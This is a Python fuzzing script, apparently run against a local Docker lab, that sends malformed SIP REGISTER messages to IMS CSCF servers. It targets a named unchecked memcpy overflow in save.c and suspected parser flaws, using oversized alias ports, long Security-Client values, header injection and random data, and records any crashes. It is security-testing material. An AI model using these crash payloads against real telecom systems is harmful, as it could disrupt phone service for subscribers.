#!/usr/bin/env python3
"""
Aggressive CSCF Fuzzer
======================
More aggressive crash triggers targeting specific code paths.

Key findings from source analysis:
1. save.c:229 - memcpy(portbuf, port_s, (p - port_s)) - portbuf is 5 bytes, NO bounds check
2. sec_agree.c:166 - while(i <= body.len) - potential off-by-one
3. parse_via.c - complex state machine, edge cases
"""

import socket
import sys
import time
import random
import struct
import subprocess

PCSCF_IP = "172.22.0.21"
PCSCF_PORT = 5060
ICSCF_IP = "172.22.0.19"
ICSCF_PORT = 4060
SCSCF_IP = "172.22.0.20"
SCSCF_PORT = 6060

UE_IP = "172.29.0.18"
IMS_DOMAIN = "ims.mnc009.mcc460.3gppnetwork.org"


def send_raw(data, target_ip, target_port, proto='udp', timeout=2):
    """Send raw bytes"""
    try:
        if proto == 'udp':
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
        sock.settimeout(timeout)
        sock.send(data)
        try:
            return sock.recv(65535)
        except:
            return None
    except Exception as e:
        return str(e).encode()
    finally:
        sock.close()


def check_crash(container):
    """Check if container crashed"""
    result = subprocess.run(
        ['docker', 'inspect', '-f', '{{.State.Running}}', container],
        capture_output=True, text=True
    )
    return result.stdout.strip() == 'true'


def test_alias_overflow():
    """
    Target: save.c line 229
    char portbuf[5];
    memcpy(portbuf, port_s, (p - port_s));  // NO BOUNDS CHECK!

    The alias format is: alias=HOST~PORT~PROTO
    If PORT is longer than 4 chars, it overflows portbuf
    """
    print("[*] Testing alias overflow (save.c:229)")

    # The key is to have a Contact with alias parameter where port > 4 digits
    # Format: alias=IP~PORT~PROTO

    test_cases = [
        # Port exactly 5 chars (overflow by 1)
        "alias=1.2.3.4~12345~1",
        # Port 10 chars
        "alias=1.2.3.4~1234567890~1",
        # Port 100 chars
        f"alias=1.2.3.4~{'9' * 100}~1",
        # Port 1000 chars
        f"alias=1.2.3.4~{'9' * 1000}~1",
        # Missing proto separator
        "alias=1.2.3.4~12345",
        # Multiple tildes
        "alias=1.2.3.4~12345~1~extra~data",
        # Negative port
        "alias=1.2.3.4~-1~1",
        # Hex port
        "alias=1.2.3.4~0xFFFF~1",
    ]

    for i, alias in enumerate(test_cases):
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-alias{i}\r\n"
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test{i}\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: alias-test-{i}@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060;{alias}>;expires=3600\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        ).encode()

        print(f"  Case {i}: {alias[:50]}...")
        send_raw(msg, PCSCF_IP, PCSCF_PORT)
        time.sleep(0.2)

        if not check_crash('pcscf'):
            print(f"  !!! P-CSCF CRASHED on case {i}: {alias}")
            return True

    return False


def test_sec_agree_overflow():
    """
    Target: sec_agree.c parse_sec_agree()
    Line 166: while(i <= body.len) - off by one potential
    """
    print("[*] Testing Security-Client parsing")

    test_cases = [
        # Empty mechanism
        b"Security-Client: \r\n",
        # Just semicolon
        b"Security-Client: ;\r\n",
        # Missing value
        b"Security-Client: ipsec-3gpp; alg=\r\n",
        # Very long name
        b"Security-Client: ipsec-3gpp; " + b"A" * 10000 + b"=value\r\n",
        # Very long value
        b"Security-Client: ipsec-3gpp; alg=" + b"B" * 10000 + b"\r\n",
        # Unicode
        "Security-Client: ipsec-3gpp; alg=hmac-😀-96\r\n".encode(),
        # Null bytes
        b"Security-Client: ipsec-3gpp; alg=\x00\x00\x00\r\n",
        # Newline injection
        b"Security-Client: ipsec-3gpp; alg=test\r\nX-Injected: yes\r\n",
        # SPI overflow (uint32)
        b"Security-Client: ipsec-3gpp; spi-c=4294967296\r\n",  # 2^32
        b"Security-Client: ipsec-3gpp; spi-c=18446744073709551616\r\n",  # 2^64
        # Negative SPI
        b"Security-Client: ipsec-3gpp; spi-c=-1\r\n",
        # Multiple mechanisms
        b"Security-Client: " + b"ipsec-3gpp; alg=test," * 1000 + b"\r\n",
    ]

    for i, sec_hdr in enumerate(test_cases):
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-sec{i}\r\n"
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test{i}\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: sec-test-{i}@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
            f"Max-Forwards: 70\r\n"
        ).encode() + sec_hdr + b"Content-Length: 0\r\n\r\n"

        print(f"  Case {i}: {sec_hdr[:50]}...")
        send_raw(msg, PCSCF_IP, PCSCF_PORT)
        time.sleep(0.2)

        if not check_crash('pcscf'):
            print(f"  !!! P-CSCF CRASHED on case {i}")
            return True

    return False


def test_via_state_machine():
    """
    Target: parse_via.c - complex state machine
    """
    print("[*] Testing Via parser state machine")

    test_cases = [
        # Incomplete protocol
        b"Via: SIP/2.0/\r\n",
        # Invalid protocol
        b"Via: SIP/2.0/INVALIDPROTO " + UE_IP.encode() + b"\r\n",
        # Missing host
        b"Via: SIP/2.0/UDP \r\n",
        # IPv6 malformed
        b"Via: SIP/2.0/UDP [::1\r\n",
        b"Via: SIP/2.0/UDP [:::1]\r\n",
        b"Via: SIP/2.0/UDP [1:2:3:4:5:6:7:8:9]\r\n",
        # Port overflow
        b"Via: SIP/2.0/UDP " + UE_IP.encode() + b":999999999\r\n",
        # Branch with special chars
        b"Via: SIP/2.0/UDP " + UE_IP.encode() + b";branch=z9hG4bK" + b"\x00" * 100 + b"\r\n",
        # Very long parameter name
        b"Via: SIP/2.0/UDP " + UE_IP.encode() + b";" + b"A" * 10000 + b"=value\r\n",
        # Multiple Via with loop
        b"Via: SIP/2.0/UDP " + UE_IP.encode() + b"\r\n" * 100,
        # Comment injection
        b"Via: SIP/2.0/UDP " + UE_IP.encode() + b" (comment\r\n",
        # Tab instead of space
        b"Via:\tSIP/2.0/UDP\t" + UE_IP.encode() + b"\r\n",
    ]

    for i, via_hdr in enumerate(test_cases):
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        ).encode() + via_hdr + (
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test{i}\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: via-test-{i}@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
            f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        ).encode()

        print(f"  Case {i}: {via_hdr[:50]}...")
        send_raw(msg, PCSCF_IP, PCSCF_PORT)
        time.sleep(0.2)

        if not check_crash('pcscf'):
            print(f"  !!! P-CSCF CRASHED on case {i}")
            return True

    return False


def test_tcp_fragmentation():
    """
    Target: TCP message reassembly
    Send fragmented SIP messages
    """
    print("[*] Testing TCP fragmentation")

    msg = (
        f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
        f"Via: SIP/2.0/TCP {UE_IP}:5060;branch=z9hG4bK-tcpfrag\r\n"
        f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=tcptest\r\n"
        f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
        f"Call-ID: tcp-frag@{UE_IP}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:13300000001@{UE_IP}:5060>;expires=3600\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n\r\n"
    ).encode()

    # Send in tiny fragments
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((PCSCF_IP, PCSCF_PORT))

        for i in range(0, len(msg), 5):
            sock.send(msg[i:i+5])
            time.sleep(0.01)

        time.sleep(1)
        sock.close()
        print("  Sent fragmented message")
    except Exception as e:
        print(f"  Error: {e}")

    # Incomplete message (no final CRLF)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((PCSCF_IP, PCSCF_PORT))
        sock.send(msg[:-2])  # Remove final CRLF
        time.sleep(2)
        sock.close()
        print("  Sent incomplete message")
    except Exception as e:
        print(f"  Error: {e}")


def test_random_fuzz():
    """
    Random fuzzing with various malformed data
    """
    print("[*] Random fuzzing")

    for i in range(100):
        # Random length
        length = random.randint(10, 5000)
        # Random data with some structure
        data = bytearray(random.getrandbits(8) for _ in range(length))

        # Sometimes inject SIP-like structure
        if random.random() < 0.3:
            prefix = random.choice([
                b"REGISTER sip:",
                b"INVITE sip:",
                b"Via: SIP/2.0/",
                b"Contact: <sip:",
                b"\r\n\r\n",
            ])
            data[:len(prefix)] = prefix

        try:
            send_raw(bytes(data), PCSCF_IP, PCSCF_PORT, timeout=0.5)
        except:
            pass

        if i % 20 == 0:
            print(f"  Sent {i} random packets...")
            if not check_crash('pcscf'):
                print(f"  !!! P-CSCF CRASHED at iteration {i}")
                return True

    return False


def test_contact_parsing():
    """
    Target: Contact header parsing
    """
    print("[*] Testing Contact parsing")

    test_cases = [
        # Missing URI
        b"Contact: \r\n",
        # Missing angle brackets
        b"Contact: sip:user@host\r\n",
        # Multiple contacts
        b"Contact: <sip:a@b>, <sip:c@d>, <sip:e@f>\r\n",
        # Very long URI
        b"Contact: <sip:" + b"A" * 10000 + b"@host>\r\n",
        # Invalid URI chars
        b"Contact: <sip:\x00\x01\x02@host>\r\n",
        # Expires overflow
        b"Contact: <sip:a@b>;expires=99999999999999999999\r\n",
        # Negative expires
        b"Contact: <sip:a@b>;expires=-1\r\n",
        # Many parameters
        b"Contact: <sip:a@b>" + b";param=value" * 1000 + b"\r\n",
        # Nested angle brackets
        b"Contact: <sip:<sip:a@b>@host>\r\n",
        # Unicode
        "Contact: <sip:用户@主机>\r\n".encode(),
    ]

    for i, contact_hdr in enumerate(test_cases):
        msg = (
            f"REGISTER sip:{IMS_DOMAIN} SIP/2.0\r\n"
            f"Via: SIP/2.0/UDP {UE_IP}:5060;branch=z9hG4bK-contact{i}\r\n"
            f"From: <sip:13300000001@{IMS_DOMAIN}>;tag=test{i}\r\n"
            f"To: <sip:13300000001@{IMS_DOMAIN}>\r\n"
            f"Call-ID: contact-test-{i}@{UE_IP}\r\n"
            f"CSeq: 1 REGISTER\r\n"
        ).encode() + contact_hdr + (
            f"Max-Forwards: 70\r\n"
            f"Content-Length: 0\r\n\r\n"
        ).encode()

        print(f"  Case {i}: {contact_hdr[:50]}...")
        send_raw(msg, PCSCF_IP, PCSCF_PORT)
        time.sleep(0.2)

        if not check_crash('pcscf'):
            print(f"  !!! P-CSCF CRASHED on case {i}")
            return True

    return False


def main():
    print("=" * 60)
    print("Aggressive CSCF Fuzzer")
    print("=" * 60)

    tests = [
        ("Alias Overflow", test_alias_overflow),
        ("Security-Client Parsing", test_sec_agree_overflow),
        ("Via State Machine", test_via_state_machine),
        ("Contact Parsing", test_contact_parsing),
        ("TCP Fragmentation", test_tcp_fragmentation),
        ("Random Fuzz", test_random_fuzz),
    ]

    crashed = []

    for name, func in tests:
        print(f"\n{'=' * 50}")
        print(f"Test: {name}")
        print(f"{'=' * 50}")

        try:
            if func():
                crashed.append(name)
                print(f"\n*** CRASH DETECTED in {name} ***")
                # Restart container
                print("Restarting container...")
                subprocess.run(['docker', 'restart', 'pcscf'], capture_output=True)
                time.sleep(10)
        except Exception as e:
            print(f"Error: {e}")

    print("\n" + "=" * 60)
    print("Summary")
    print("=" * 60)
    if crashed:
        print(f"Crashes triggered by: {', '.join(crashed)}")
    else:
        print("No crashes detected")


if __name__ == '__main__':
    main()
